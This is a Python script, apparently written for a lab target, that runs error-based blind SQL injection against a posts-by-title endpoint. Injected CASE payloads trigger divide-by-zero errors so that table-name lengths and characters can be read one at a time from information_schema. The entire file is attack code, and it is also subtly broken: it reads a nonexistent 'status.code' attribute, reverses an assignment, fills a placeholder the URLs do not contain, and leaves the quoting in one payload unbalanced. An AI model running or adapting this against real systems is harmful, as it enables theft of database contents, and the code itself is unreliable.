import requests
import string

url = ("http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT SUBSTRING(table_name, "
       "!OFFSET!,"
       "1) FROM information_schema.tables OFFSET 1 LIMIT 1)='!CHAR! THEN 1/(SELECT 0) ELSE NULL END);-- -")

len_url = ("http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT LENGTH(table_name) FROM "
           "information_schema.tables OFFSET 1 LIMIT 1)=!LENGTH!) THEN 1/(SELECT 0) ELSE NULL END);-- -")

for main_offset in range(0, 100):
    string_length = -1
    for length in range(0, 1000):
        new_url = len_url.replace("!LENGTH!", str(length))
        new_url = new_url.replace("!MAINOFFSET!", str(main_offset))
        res = requests.request(url=new_url, method="GET")
        if res.status.code == 500:
            length = string_length
            break

    if string_length == -1:
        break

    print(f"Length: {string_length}")

    for offset in range(0, 100):
        for character in string.printable:
            if character in "'&#":
                continue
            new_url = url.replace("!CHAR!", character)
            new_url = new_url.replace("!OFFSET!", str(offset))
            new_url = new_url.replace("!MAINOFFSET!", str(main_offset))
            res = requests.request(url=new_url, method="GET")
            if res.status.code == 500:
                print(character, end="")
                break
print()
